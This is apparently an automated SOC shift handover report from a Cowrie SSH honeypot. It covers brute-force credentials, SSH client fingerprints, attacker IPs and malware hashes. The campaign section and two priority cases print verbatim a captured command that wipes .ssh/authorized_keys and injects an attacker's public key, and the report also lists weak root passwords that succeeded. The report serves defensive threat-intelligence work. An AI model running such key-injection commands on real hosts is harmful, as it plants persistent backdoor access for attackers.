# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-15 |
| **Generated At** | 2026-06-15T22:23:09Z |
| **Shift Time** | 22:23 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **69** |
| Confirmed Threats | **44** |
| False Positives Filtered | **25** (36.2%) |
| Unique Attacker IPs | **36** |
| Countries of Origin | **15** |
| High Severity Cases | **7** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **62** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **17** |
| Unique Credential Pairs | **14** |
| Unique Usernames | **10** |
| Unique Passwords | **14** |
| Successful Auth Pairs | **7** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 7 |
| `345gs5662d34` | 2 |
| `lisa` | 1 |
| `turkey` | 1 |
| `samba` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `root2007` | 2 |
| `345gs5662d34` | 2 |
| `3245gs5662d34` | 2 |
| `lisa` | 1 |
| `123654` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `root2007` | 2 |
| `345gs5662d34` | `345gs5662d34` | 2 |
| `root` | `3245gs5662d34` | 2 |
| `lisa` | `lisa` | 1 |
| `root` | `123654` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `123654` | `116.114.84.246` | 2026-06-15T19:12:45 |
| `root` | `root2007` | `179.185.1.97` | 2026-06-15T19:39:47 |
| `root` | `root2007` | `49.124.148.200` | 2026-06-15T19:39:59 |
| `root` | `Admin321` | `42.200.78.166` | 2026-06-15T21:12:13 |
| `root` | `3245gs5662d34` | `42.200.78.166` | 2026-06-15T21:12:17 |
| `root` | `ZXCasd123` | `192.169.213.186` | 2026-06-15T21:17:58 |
| `root` | `3245gs5662d34` | `192.169.213.186` | 2026-06-15T21:18:04 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **69** |
| Sessions with Fingerprint | **8** |
| Unique HASSH Fingerprints | **8** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 11 |
| OpenSSH | 11 |
| Go SSH scanner | 2 |
| Paramiko (Python) | 1 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 10 | 4 |
| `acaa53e0a7d7...` | Mirai/variant | 9 | 9 |
| `03a80b21afa8...` | Modern SSH client | 1 | 1 |
| `d6729b7f2442...` | Mirai/variant | 1 | 1 |
| `873a5fb5fedc...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 10 | 4 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 9 | 9 | Mirai/variant |
| `95420f9d932d...` | OpenSSH | 2 | 2 | — |
| `03a80b21afa8...` | libssh | 1 | 1 | Modern SSH client |
| `d6729b7f2442...` | Paramiko (Python) | 1 | 1 | Mirai/variant |
| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `192.169.213.186`, `42.200.78.166`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **36** |
| Unique ASNs | **30** |
| High-Risk ASNs | **22** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS26496` | GoDaddy.com, LLC | 2 | HIGH |
| `AS396982` | Google LLC | 2 | LOW |
| `AS22773` | Cox Communications Inc. | 2 | MEDIUM |
| `AS46562` | Performive LLC | 2 | MEDIUM |
| `AS12389` | PJSC Rostelecom | 1 | HIGH |
| `AS3786` | LG DACOM Corporation | 1 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (7)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-004228fd40e1

| Field | Detail |
|---|---|
| **Source IP** | `116.114.84[.]246` |
| **First Seen** | 2026-06-15 19:12 |
| **Last Seen** | 2026-06-15 19:12 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 19:12:43` | `cowrie.session.connect` |
| `2026-06-15 19:12:44` | `cowrie.client.version` |
| `2026-06-15 19:12:44` | `cowrie.client.kex` |
| `2026-06-15 19:12:45` | `cowrie.login.success` |
| `2026-06-15 19:12:46` | `cowrie.direct-tcpip.request` |
| `2026-06-15 19:12:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.114.84[.]246` to AbuseIPDB if not already reported
- [ ] Block `116.114.84[.]246` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce65994f304e

| Field | Detail |
|---|---|
| **Source IP** | `179.185.1[.]97` |
| **First Seen** | 2026-06-15 19:39 |
| **Last Seen** | 2026-06-15 19:39 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 19:39:44` | `cowrie.session.connect` |
| `2026-06-15 19:39:44` | `cowrie.client.version` |
| `2026-06-15 19:39:44` | `cowrie.client.kex` |
| `2026-06-15 19:39:47` | `cowrie.login.success` |
| `2026-06-15 19:39:48` | `cowrie.direct-tcpip.request` |
| `2026-06-15 19:39:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.185.1[.]97` to AbuseIPDB if not already reported
- [ ] Block `179.185.1[.]97` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e7ba1cbfe67

| Field | Detail |
|---|---|
| **Source IP** | `49.124.148[.]200` |
| **First Seen** | 2026-06-15 19:39 |
| **Last Seen** | 2026-06-15 19:40 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 19:39:56` | `cowrie.session.connect` |
| `2026-06-15 19:39:56` | `cowrie.client.version` |
| `2026-06-15 19:39:56` | `cowrie.client.kex` |
| `2026-06-15 19:39:59` | `cowrie.login.success` |
| `2026-06-15 19:39:59` | `cowrie.direct-tcpip.request` |
| `2026-06-15 19:40:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.148[.]200` to AbuseIPDB if not already reported
- [ ] Block `49.124.148[.]200` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-185d41f470f0

| Field | Detail |
|---|---|
| **Source IP** | `42.200.78[.]166` |
| **First Seen** | 2026-06-15 21:12 |
| **Last Seen** | 2026-06-15 21:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 21:12:13` | `cowrie.session.connect` |
| `2026-06-15 21:12:13` | `cowrie.client.version` |
| `2026-06-15 21:12:13` | `cowrie.client.kex` |
| `2026-06-15 21:12:13` | `cowrie.login.success` |
| `2026-06-15 21:12:14` | `cowrie.session.params` |
| `2026-06-15 21:12:14` | `cowrie.command.input` |
| `2026-06-15 21:12:14` | `cowrie.command.failed` |
| `2026-06-15 21:12:14` | `cowrie.log.closed` |
| `2026-06-15 21:12:14` | `cowrie.session.params` |
| `2026-06-15 21:12:14` | `cowrie.command.input` |
| `2026-06-15 21:12:14` | `cowrie.session.file_download` |
| `2026-06-15 21:12:14` | `cowrie.log.closed` |
| `2026-06-15 21:12:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.200.78[.]166` to AbuseIPDB if not already reported
- [ ] Block `42.200.78[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-960d9198c9cc

| Field | Detail |
|---|---|
| **Source IP** | `42.200.78[.]166` |
| **First Seen** | 2026-06-15 21:12 |
| **Last Seen** | 2026-06-15 21:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 21:12:17` | `cowrie.session.connect` |
| `2026-06-15 21:12:17` | `cowrie.client.version` |
| `2026-06-15 21:12:17` | `cowrie.client.kex` |
| `2026-06-15 21:12:17` | `cowrie.login.success` |
| `2026-06-15 21:12:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.200.78[.]166` to AbuseIPDB if not already reported
- [ ] Block `42.200.78[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32c5d80e67fb

| Field | Detail |
|---|---|
| **Source IP** | `192.169.213[.]186` |
| **First Seen** | 2026-06-15 21:17 |
| **Last Seen** | 2026-06-15 21:18 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 21:17:57` | `cowrie.session.connect` |
| `2026-06-15 21:17:57` | `cowrie.client.version` |
| `2026-06-15 21:17:57` | `cowrie.client.kex` |
| `2026-06-15 21:17:58` | `cowrie.login.success` |
| `2026-06-15 21:17:59` | `cowrie.session.params` |
| `2026-06-15 21:17:59` | `cowrie.command.input` |
| `2026-06-15 21:17:59` | `cowrie.command.failed` |
| `2026-06-15 21:17:59` | `cowrie.log.closed` |
| `2026-06-15 21:18:00` | `cowrie.session.params` |
| `2026-06-15 21:18:00` | `cowrie.command.input` |
| `2026-06-15 21:18:00` | `cowrie.session.file_download` |
| `2026-06-15 21:18:00` | `cowrie.log.closed` |
| `2026-06-15 21:18:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.169.213[.]186` to AbuseIPDB if not already reported
- [ ] Block `192.169.213[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b55722b32bc9

| Field | Detail |
|---|---|
| **Source IP** | `192.169.213[.]186` |
| **First Seen** | 2026-06-15 21:18 |
| **Last Seen** | 2026-06-15 21:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 21:18:03` | `cowrie.session.connect` |
| `2026-06-15 21:18:03` | `cowrie.client.version` |
| `2026-06-15 21:18:03` | `cowrie.client.kex` |
| `2026-06-15 21:18:04` | `cowrie.login.success` |
| `2026-06-15 21:18:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.169.213[.]186` to AbuseIPDB if not already reported
- [ ] Block `192.169.213[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `157.230.150[.]187` | **7** | 2026-06-15 18:46 | 2026-06-15 21:56 | 6m | 0 | `T1592` | 🟢 LOW |
| `198.12.149[.]130` | **7** | 2026-06-15 20:07 | 2026-06-15 22:14 | 3m | 0 | `T1592` | 🟢 LOW |
| `192.169.213[.]186` | **3** | 2026-06-15 20:04 | 2026-06-15 21:18 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `128.203.202[.]236` | **2** | 2026-06-15 21:24 | 2026-06-15 21:24 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.55.90[.]128` | **2** | 2026-06-15 20:13 | 2026-06-15 20:14 | 0m | 0 | `T1592` | 🟢 LOW |
| `106.246.89[.]70` | 1 | 2026-06-15 19:43 | 2026-06-15 19:43 | 28s | 0 | `T1592` | 🟢 LOW |
| `115.190.153[.]156` | 1 | 2026-06-15 20:51 | 2026-06-15 20:53 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.33.242[.]180` | 1 | 2026-06-15 18:56 | 2026-06-15 18:56 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `122.117.40[.]197` | 1 | 2026-06-15 19:45 | 2026-06-15 19:45 | 17s | 0 | `T1592` | 🟢 LOW |
| `176.170.1[.]244` | 1 | 2026-06-15 21:51 | 2026-06-15 21:51 | 10s | 0 | `T1592` | 🟢 LOW |
| `178.178.194[.]136` | 1 | 2026-06-15 21:11 | 2026-06-15 21:11 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `182.42.93[.]139` | 1 | 2026-06-15 18:54 | 2026-06-15 18:56 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.82.108[.]109` | 1 | 2026-06-15 21:38 | 2026-06-15 21:38 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `185.242.226[.]19` | 1 | 2026-06-15 20:18 | 2026-06-15 20:18 | 9s | 0 | `T1592` | 🟢 LOW |
| `211.178.165[.]251` | 1 | 2026-06-15 21:51 | 2026-06-15 21:51 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `223.210.27[.]53` | 1 | 2026-06-15 21:41 | 2026-06-15 21:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `42.200.78[.]166` | 1 | 2026-06-15 21:12 | 2026-06-15 21:12 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `43.156.61[.]33` | 1 | 2026-06-15 19:33 | 2026-06-15 19:33 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `46.77.69[.]201` | 1 | 2026-06-15 20:12 | 2026-06-15 20:12 | 4s | 0 | `T1592` | 🟢 LOW |
| `62.192.226[.]83` | 1 | 2026-06-15 20:52 | 2026-06-15 20:52 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `66.132.186[.]205` | 1 | 2026-06-15 21:05 | 2026-06-15 21:05 | 15s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (35 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `fc6f8ae5f64e4f17481f7e3be29a1c56949f216a998414188003eae1db20c9e5` | GZip Archive | `fc6f8ae5f64e4f17...` | 14/100 | 🟢 LOW | **35/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `116.114.84[.]246` | CN | China Unicom Neimeng Province Network | **100** ⚠️ | 50 |
| `122.117.40[.]197` | TW | Chunghwa Telecom Data Communication Business Group | **100** ⚠️ | 1 |
| `106.246.89[.]70` | KR | LG DACOM Corporation | **100** ⚠️ | 50 |
| `192.169.213[.]186` | US | GoDaddy.com, LLC | **100** ⚠️ | 9 |
| `198.12.149[.]130` | US | GoDaddy.com, LLC | **100** ⚠️ | 2 |
| `117.33.242[.]180` | CN | CHINANET Shanxi(SN) province network | **100** ⚠️ | 20 |
| `185.242.226[.]19` | NL | HostUS Solutions LLC | **100** ⚠️ | 50 |
| `49.124.148[.]200` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 16 |
| `157.230.150[.]187` | US | DigitalOcean, LLC | **100** ⚠️ | 3 |
| `211.178.165[.]251` | KR | SK Broadband Co Ltd | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 26 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 10 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 7 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 2 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 2 |

---

## 🔕 False Positive Summary (25 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 3 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 21 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 69 cases |
| Tool 34  | Credential Extractor        | ✅ 17 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 8 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 36 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 25 filtered (36.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 30 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 35 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
